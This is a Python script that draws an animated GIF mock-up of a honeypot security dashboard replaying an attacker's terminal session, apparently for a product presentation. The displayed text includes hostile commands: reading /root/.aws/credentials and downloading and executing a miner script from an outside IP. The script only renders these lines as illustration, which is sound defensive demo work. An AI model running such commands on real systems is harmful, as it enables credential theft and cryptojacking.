import os
from PIL import Image, ImageDraw, ImageFont

W, H = 1280, 720
frames = []

font_mono = ImageFont.truetype('C:/Windows/Fonts/consola.ttf', 20)
font_bold = ImageFont.truetype('C:/Windows/Fonts/consola.ttf', 22)
font_ui_bold = ImageFont.truetype('C:/Windows/Fonts/segoeui.ttf', 20)
font_ui = ImageFont.truetype('C:/Windows/Fonts/segoeui.ttf', 16)
font_badge = ImageFont.truetype('C:/Windows/Fonts/segoeui.ttf', 15)

def draw_soc_layout(play_state, progress_ratio, term_lines, blocked=False):
    img = Image.new('RGB', (W, H), '#130f0c')
    draw = ImageDraw.Draw(img)
    
    # Outer Card
    draw.rounded_rectangle([(30, 20), (W - 30, H - 20)], radius=12, fill='#1a1410', outline='#2d221a', width=2)
    
    # Header
    draw.rounded_rectangle([(30, 20), (W - 30, 75)], radius=12, fill='#231a14')
    draw.rectangle([(30, 55), (W - 30, 75)], fill='#231a14')
    
    # Title & Incident badge
    draw.text((60, 48), 'HoneyForge SOC :: Web-TTY Session Replay (TerminalPlayer)', fill='#ffffff', font=font_ui_bold, anchor='lm')
    draw.rounded_rectangle([(W - 250, 35), (W - 50, 63)], radius=6, fill='#451a03', outline='#f59e0b', width=1)
    draw.text((W - 150, 48), 'CRITICAL INCIDENT #1092', fill='#f59e0b', font=font_badge, anchor='mm')
    
    # Player Controls Bar (75 to 135)
    draw.rectangle([(30, 75), (W - 30, 135)], fill='#1f1813')
    
    # Play / Pause button
    btn_color = '#22c55e' if play_state == 'playing' else '#f59e0b'
    draw.rounded_rectangle([(55, 88), (145, 122)], radius=6, fill='#2c1e14', outline=btn_color, width=1)
    draw.text((100, 104), '▶ PLAY' if play_state != 'playing' else '⏸ PAUSE', fill=btn_color, font=font_ui, anchor='mm')
    
    # Speed badge
    draw.rounded_rectangle([(160, 88), (220, 122)], radius=6, fill='#2c1e14', outline='#57534e', width=1)
    draw.text((190, 104), '2x', fill='#f59e0b', font=font_ui, anchor='mm')
    
    # Timestamp
    curr_sec = int(progress_ratio * 14)
    draw.text((250, 104), f'00:{curr_sec:02d} / 00:14', fill='#a8a29e', font=font_mono, anchor='lm')
    
    # Scrub timeline bar
    bar_x1, bar_x2 = 420, W - 60
    bar_y = 105
    draw.line([(bar_x1, bar_y), (bar_x2, bar_y)], fill='#44372e', width=6)
    progress_x = int(bar_x1 + (bar_x2 - bar_x1) * progress_ratio)
    draw.line([(bar_x1, bar_y), (progress_x, bar_y)], fill='#f59e0b', width=6)
    draw.ellipse([(progress_x - 7, bar_y - 7), (progress_x + 7, bar_y + 7)], fill='#fbbf24')
    
    # Terminal Replay Box (145 to H - 110)
    draw.rounded_rectangle([(50, 150), (W - 50, H - 120)], radius=8, fill='#100c09', outline='#291e17', width=1)
    
    y_term = 175
    for line, color in term_lines:
        draw.text((75, y_term), line, fill=color, font=font_mono)
        y_term += 32
        
    # Bottom Action & Telemetry Bar (H - 105 to H - 30)
    draw.rectangle([(30, H - 110), (W - 30, H - 20)], fill='#221a14')
    
    # Attacker metadata
    draw.text((60, H - 75), 'Attacker: 194.26.29.11 (AS48282 / RU)', fill='#e7e5e4', font=font_ui, anchor='lm')
    draw.text((60, H - 45), 'Threat Score: 96.8/100 (High Risk) | Trap: medium-ssh-ubuntu', fill='#f59e0b', font=font_ui, anchor='lm')
    
    # Action Button
    if not blocked:
        draw.rounded_rectangle([(W - 320, H - 85), (W - 60, H - 40)], radius=8, fill='#7f1d1d', outline='#ef4444', width=2)
        draw.text((W - 190, H - 62), '🛡 ЗАБЛОКИРОВАТЬ IP В DMZ', fill='#ffffff', font=font_ui_bold, anchor='mm')
    else:
        draw.rounded_rectangle([(W - 320, H - 85), (W - 60, H - 40)], radius=8, fill='#14532d', outline='#22c55e', width=2)
        draw.text((W - 190, H - 62), '✅ IP ЗАБЛОКИРОВАН (0.4ms)', fill='#86efac', font=font_ui_bold, anchor='mm')
        
    return img

scenario = [
    # 0 sec: Initial paused state
    {"state": "paused", "prog": 0.05, "lines": [
        ("root@ubuntu-srv:~# id", "#ffffff"),
        ("uid=0(root) gid=0(root) groups=0(root)", "#22c55e"),
        ("root@ubuntu-srv:~# ", "#ffffff")
    ], "blocked": False, "pause": 700},
    # 2 sec: Playing, commands appearing
    {"state": "playing", "prog": 0.25, "lines": [
        ("root@ubuntu-srv:~# id", "#ffffff"),
        ("uid=0(root) gid=0(root) groups=0(root)", "#22c55e"),
        ("root@ubuntu-srv:~# cat /root/.aws/credentials", "#ffffff"),
        ("[!] HONEYTOKEN TRIGGERED: Fake AWS Key Access Logged!", "#ef4444"),
        ("root@ubuntu-srv:~# ", "#ffffff")
    ], "blocked": False, "pause": 800},
    # 4 sec: Malicious payload download
    {"state": "playing", "prog": 0.55, "lines": [
        ("root@ubuntu-srv:~# id", "#ffffff"),
        ("uid=0(root) gid=0(root) groups=0(root)", "#22c55e"),
        ("root@ubuntu-srv:~# cat /root/.aws/credentials", "#ffffff"),
        ("[!] HONEYTOKEN TRIGGERED: Fake AWS Key Access Logged!", "#ef4444"),
        ("root@ubuntu-srv:~# wget http://194.26.29.11/xmrig.sh -O /tmp/x.sh", "#ffffff"),
        ("root@ubuntu-srv:~# chmod +x /tmp/x.sh && ./tmp/x.sh", "#ffffff"),
        ("[FORENSIC] Payload captured: sha256=e3b0c44298fc1c149afb...", "#f59e0b"),
        ("root@ubuntu-srv:~# ", "#ffffff")
    ], "blocked": False, "pause": 1000},
    # 6 sec: Operator clicks Block
    {"state": "playing", "prog": 0.85, "lines": [
        ("root@ubuntu-srv:~# id", "#ffffff"),
        ("uid=0(root) gid=0(root) groups=0(root)", "#22c55e"),
        ("root@ubuntu-srv:~# cat /root/.aws/credentials", "#ffffff"),
        ("[!] HONEYTOKEN TRIGGERED: Fake AWS Key Access Logged!", "#ef4444"),
        ("root@ubuntu-srv:~# wget http://194.26.29.11/xmrig.sh -O /tmp/x.sh", "#ffffff"),
        ("root@ubuntu-srv:~# chmod +x /tmp/x.sh && ./tmp/x.sh", "#ffffff"),
        ("[FORENSIC] Payload captured: sha256=e3b0c44298fc1c149afb...", "#f59e0b"),
        ("Connection closed by foreign host. (IP blocked by SOC)", "#ef4444")
    ], "blocked": False, "pause": 500},
    # 7 sec: Blocked confirmation
    {"state": "playing", "prog": 1.0, "lines": [
        ("root@ubuntu-srv:~# id", "#ffffff"),
        ("uid=0(root) gid=0(root) groups=0(root)", "#22c55e"),
        ("root@ubuntu-srv:~# cat /root/.aws/credentials", "#ffffff"),
        ("[!] HONEYTOKEN TRIGGERED: Fake AWS Key Access Logged!", "#ef4444"),
        ("root@ubuntu-srv:~# wget http://194.26.29.11/xmrig.sh -O /tmp/x.sh", "#ffffff"),
        ("root@ubuntu-srv:~# chmod +x /tmp/x.sh && ./tmp/x.sh", "#ffffff"),
        ("[FORENSIC] Payload captured: sha256=e3b0c44298fc1c149afb...", "#f59e0b"),
        ("Connection closed by foreign host. (IP blocked by SOC)", "#ef4444")
    ], "blocked": True, "pause": 2500}
]

for s in scenario:
    im = draw_soc_layout(s["state"], s["prog"], s["lines"], s["blocked"])
    im_p = im.convert('P', palette=Image.ADAPTIVE)
    frames.append((im_p, s["pause"]))

out_path = r'c:\Progects\HoneyForge\presentation_media\gif_webtty_player.gif'
images = [f[0] for f in frames]
durations = [f[1] for f in frames]

images[0].save(
    out_path,
    save_all=True,
    append_images=images[1:],
    duration=durations,
    loop=0,
    optimize=True
)
print('gif_webtty_player.gif generated successfully!')
